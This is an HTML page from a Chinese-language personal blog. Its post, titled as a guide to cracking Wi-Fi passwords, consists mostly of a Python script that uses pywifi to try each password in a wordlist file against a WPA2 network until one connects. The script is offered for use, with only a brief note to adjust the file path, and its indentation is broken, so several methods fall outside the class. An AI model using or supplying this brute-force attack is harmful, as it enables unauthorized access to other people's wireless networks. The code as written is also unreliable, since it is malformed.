@@ -1,0 +1,216 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>破解WI-FI密码 | Knifefire</title><meta name="author" content="knifefire"><meta name="copyright" content="knifefire"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="python破解wifi密码1.&gt;安装常用模块和库time、pywifi等等 2.&gt;编写代码#!&#x2F;usr&#x2F;bin&#x2F;env python #-*- coding: UTF-8 -*-  import time  # 时间 import pywifi  # 破解wifi from pywifi import const  # 引用一些定义 from asyncio.tasks import">
+<meta property="og:type" content="article">
+<meta property="og:title" content="破解WI-FI密码">
+<meta property="og:url" content="knifefire.top/2020/10/06/%E7%A0%B4%E8%A7%A3WI-FI%E5%AF%86%E7%A0%81/index.html">
+<meta property="og:site_name" content="Knifefire">
+<meta property="og:description" content="python破解wifi密码1.&gt;安装常用模块和库time、pywifi等等 2.&gt;编写代码#!&#x2F;usr&#x2F;bin&#x2F;env python #-*- coding: UTF-8 -*-  import time  # 时间 import pywifi  # 破解wifi from pywifi import const  # 引用一些定义 from asyncio.tasks import">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2020-10-06T07:59:09.000Z">
+<meta property="article:modified_time" content="2020-10-06T08:02:55.400Z">
+<meta property="article:author" content="knifefire">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="knifefire.top/2020/10/06/%E7%A0%B4%E8%A7%A3WI-FI%E5%AF%86%E7%A0%81/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '4.2.1',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2020-10-06 16:02:55'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="generator" content="Hexo 4.2.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">6</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#python破解wifi密码"><span class="toc-number">1.</span> <span class="toc-text">python破解wifi密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-gt-安装常用模块和库"><span class="toc-number">2.</span> <span class="toc-text">1.&gt;安装常用模块和库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-gt-编写代码"><span class="toc-number">3.</span> <span class="toc-text">2.&gt;编写代码</span></a></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Knifefire</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">破解WI-FI密码</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-10-06T07:59:09.000Z" title="Created 2020-10-06 15:59:09">2020-10-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-10-06T08:02:55.400Z" title="Updated 2020-10-06 16:02:55">2020-10-06</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h2 id="python破解wifi密码"><a href="#python破解wifi密码" class="headerlink" title="python破解wifi密码"></a>python破解wifi密码</h2><h2 id="1-gt-安装常用模块和库"><a href="#1-gt-安装常用模块和库" class="headerlink" title="1.&gt;安装常用模块和库"></a>1.&gt;安装常用模块和库</h2><p>time、pywifi等等</p>
+<h2 id="2-gt-编写代码"><a href="#2-gt-编写代码" class="headerlink" title="2.&gt;编写代码"></a>2.&gt;编写代码</h2><pre><code>#!/usr/bin/env python
+#-*- coding: UTF-8 -*-
+
+import time  # 时间
+import pywifi  # 破解wifi
+from pywifi import const  # 引用一些定义
+from asyncio.tasks import sleep
+
+class PoJie():
+    def __init__(self, path):
+        self.file = open(path, &quot;r&quot;, errors=&quot;ignore&quot;)
+        wifi = pywifi.PyWiFi()  # 抓取网卡接口
+        self.iface = wifi.interfaces()[0]  # 抓取第一个无限网卡
+        self.iface.disconnect()  # 测试链接断开所有链接
+
+    time.sleep(1)  # 休眠1秒
+
+    # 测试网卡是否属于断开状态，
+    assert self.iface.status() in \
+           [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
+
+def readPassWord(self):
+    print(&quot;开始破解：&quot;)
+    while True:
+
+        try:
+            myStr = self.file.readline()
+            if not myStr:
+                break
+            bool1 = self.test_connect(myStr)
+            if bool1:
+                print(&quot;密码正确：&quot;, myStr)
+                break
+            else:
+                print(&quot;密码错误:&quot; + myStr)
+            sleep(3)
+        except:
+            continue
+
+def test_connect(self, findStr):  # 测试链接
+
+    profile = pywifi.Profile()  # 创建wifi链接文件
+    profile.ssid = &quot;e2&quot;  # wifi名称
+    profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放，
+    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
+    profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
+    profile.key = findStr  # 密码
+
+    self.iface.remove_all_network_profiles()  # 删除所有的wifi文件
+    tmp_profile = self.iface.add_network_profile(profile)  # 设定新的链接文件
+    self.iface.connect(tmp_profile)  # 链接
+    time.sleep(5)
+    if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接上
+        isOK = True
+    else:
+        isOK = False
+    self.iface.disconnect()  # 断开
+    time.sleep(1)
+    # 检查断开状态
+    assert self.iface.status() in \
+           [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
+
+    return isOK
+
+def __del__(self):
+    self.file.close()
+
+
+path = r&quot;C:\Users\Administrator\Desktop\csdnwifi.txt&quot;
+start = PoJie(path)
+start.readPassWord()</code></pre><p>备注：路径要跟距自己的情况来写，哪有不对的再改改。。</p>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">knifefire</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="/knifefire.top/2020/10/06/%E7%A0%B4%E8%A7%A3WI-FI%E5%AF%86%E7%A0%81/">knifefire.top/2020/10/06/%E7%A0%B4%E8%A7%A3WI-FI%E5%AF%86%E7%A0%81/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2020/10/05/%E8%AE%BA%E6%92%A9%E5%A6%B9/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">论撩妹</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 By knifefire</div><div class="framework-info"><span>Framework </span><a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="true"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
